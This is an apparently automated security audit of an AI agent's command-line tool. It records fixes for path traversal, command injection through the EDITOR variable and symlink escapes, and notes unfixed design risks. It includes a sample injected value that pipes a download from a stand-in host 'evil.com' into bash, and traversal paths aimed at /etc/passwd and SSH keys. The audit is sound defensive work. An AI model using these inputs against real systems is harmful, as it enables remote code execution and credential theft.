# HaxAgent Security Audit Report

**Date**: 2026-05-22  
**Auditor**: Automated security review  
**Scope**: All `src/**/*.js` files (~70 files)  
**Methodology**: Full source code review of all tool implementations, CLI entry points, provider integrations, and supporting modules.

---

## Issues Fixed

### 1. [CRITICAL] Path Traversal in `file.edit` Tool

**File**: `src/tools/file-edit.js`  
**Line**: 45 (original)  
**Severity**: Critical  

**What was wrong**: The `file.edit` tool resolved file paths using `path.resolve(context.root, filePath)` directly, bypassing all path traversal protection. Every other file tool (`file.read`, `file.write`, `file.delete`, `file.search`, `file.glob`, `file.readdir`) used `resolveWithinRoot()` which validates that the resolved path stays within the workspace root. The `file.edit` tool had no such check, allowing an attacker (or a compromised AI model) to read and write **any file on the filesystem** by supplying a path like `../../etc/passwd` or `../../.ssh/id_rsa`.

**What was changed**:
- Added `resolveWithinRoot` to the imports from `./utils`
- Replaced all three occurrences of `path.resolve(context.root, filePath)` with `resolveWithinRoot(context.root, filePath)`
- The tool now throws `PATH_OUTSIDE_ROOT` if the path escapes the workspace, consistent with all other file tools.

---

### 2. [HIGH] Command Injection via `EDITOR`/`VISUAL` in Config Editor

**File**: `src/cli.js`  
**Line**: 191-197 (original)  
**Severity**: High  

**What was wrong**: The `hax-agent config edit` command spawned the user's editor with `shell: true` using `process.env.EDITOR` or `process.env.VISUAL`. With `shell: true`, Node.js passes the command through `cmd.exe` (Windows) or `/bin/sh` (Unix) for interpretation. If an attacker controlled the `EDITOR` environment variable and set it to something like `vim && curl http://evil.com/steal | bash`, the shell would execute the injected command after `vim`.

**What was changed**:
- Changed `shell: true` to `shell: false`
- Split the editor string on whitespace to support editors with arguments (e.g., `code --wait`)
- The editor executable and its arguments are now passed as an array to `spawn()`, preventing shell interpretation.

---

### 3. [MEDIUM] Symlink Escape in `file.write` Tool

**File**: `src/tools/file-write.js`  
**Line**: 54 (original)  
**Severity**: Medium  

**What was wrong**: The `file.write` tool used `resolveWithinRoot()` which validates path traversal via `../` but does **not** resolve or check symlinks. A symlink inside the workspace pointing outside the root (e.g., to `/etc/cron.d/`) would bypass the check, allowing writes to arbitrary system locations.

**What was changed**:
- Added `resolveWithinRootSafe` to imports
- Changed the path resolution from `resolveWithinRoot()` to `await resolveWithinRootSafe()`, which uses `fs.realpath()` to resolve symlinks and verify the real path stays within the workspace root.

---

### 4. [MEDIUM] Symlink Escape in `file.delete` Tool

**File**: `src/tools/file-delete.js`  
**Line**: 29 (original)  
**Severity**: Medium  

**What was wrong**: Same issue as `file.write` -- `resolveWithinRoot()` does not check symlinks. Deleting a symlink target outside the workspace could cause data loss.

**What was changed**:
- Added `resolveWithinRootSafe` to imports
- Changed the path resolution from `resolveWithinRoot()` to `await resolveWithinRootSafe()`.

---

## Issues Noted (Not Fixed -- Design Considerations)

These issues were identified but involve intentional design tradeoffs rather than clear-cut bugs. They are documented here for the maintainers' awareness.

### 5. [MEDIUM] Permissions Auto-Disabled When stdout Is Not a TTY

**File**: `src/cli.js`, line ~387  
**Description**: When stdout is not a TTY (e.g., piped to another process or running in a CI environment), the permission manager is set to `yolo` mode, which auto-approves ALL tool operations including file writes, deletions, and shell execution. Combined with a compromised model, this could lead to unattended destructive operations.  
**Recommendation**: Consider requiring an explicit `--yolo` flag for headless/piped usage, or defaulting to `normal` mode with a configurable approval mechanism for non-interactive contexts.

### 6. [LOW] API Key in URL Query Parameters for Google Provider

**File**: `src/providers/google-provider.js`, lines 580-592  
**Description**: The `@google/generative-ai` SDK transmits the API key as a URL query parameter. This means the key may appear in server logs, proxy logs, and network traces. The code already documents this in a comment.  
**Recommendation**: For production deployments, use a proxy that rewrites the key into an Authorization header or use Google Cloud Vertex AI authentication instead.

### 7. [LOW] `resolveWindowsCommand` Uses `shell: true`

**File**: `src/tools/shell.js`, line 73  
**Description**: The `resolveWindowsCommand` function spawns `where.exe` with `shell: true` on Windows. The `command` argument is passed in the spawn args array (not concatenated into a string), so shell metacharacters are properly quoted. This is low risk because `where` is a read-only command and the argument is properly array-escaped by Node.js.  
**Recommendation**: Consider changing `shell: false` for consistency, though the current behavior is safe.

### 8. [LOW] `stock.quote` Symbol Concatenated Into URL Without Encoding

**File**: `src/tools/stock-quote.js`, line 62  
**Description**: The Sina Finance API URL is constructed with direct string concatenation of the `code` parameter. While this is not exploitable for HTTP injection (the value goes into the URL path/query, not headers), using `encodeURIComponent` would be more robust.  
**Recommendation**: Apply `encodeURIComponent` to the code parameter for consistency with the Yahoo Finance path.

---

## Summary

| Severity | Count | Status |
|----------|-------|--------|
| Critical | 1     | Fixed  |
| High     | 1     | Fixed  |
| Medium   | 2     | Fixed  |
| Low      | 4     | Noted  |

The most critical finding was the complete absence of path traversal protection in the `file.edit` tool, which could allow arbitrary filesystem read/write. This has been fixed by adding the same `resolveWithinRoot()` guard used by all other file tools. The config editor's `shell: true` spawning has been hardened to `shell: false` to prevent command injection via environment variables. Two medium-severity symlink escape vectors in write/delete operations have been mitigated by upgrading to symlink-aware path resolution.
